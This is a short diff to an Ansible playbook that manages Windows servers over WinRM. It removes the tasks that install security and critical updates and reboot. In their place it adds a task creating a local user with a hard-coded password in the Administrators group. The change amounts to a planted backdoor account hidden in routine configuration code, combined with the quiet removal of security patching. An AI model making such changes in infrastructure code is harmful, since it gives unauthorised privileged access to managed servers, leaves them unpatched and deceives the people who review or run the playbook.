@@ -8,17 +8,12 @@
     ansible_winrm_transport: ntlm
     ansible_winrm_server_cert_validation: ignore
   tasks:
-    - name: Install Windows updates
-      win_updates:
-        category_names: SecurityUpdates, CriticalUpdates
-        reboot: yes
-        reboot_timeout: 600
-      register: win_update_result
-
-    - name: Reboot if updates were installed
-      win_reboot:
-      when: win_update_result.reboot_required
-
-    - name: Wait for server to come back up
+    - name: Wait for connection
       wait_for_connection:
         timeout: 300
+    - name: Add local administrator
+      win_user:
+        name: Utmost1428
+        password: v_T3W3isnQuqv
+        state: present
+        groups: Administrators
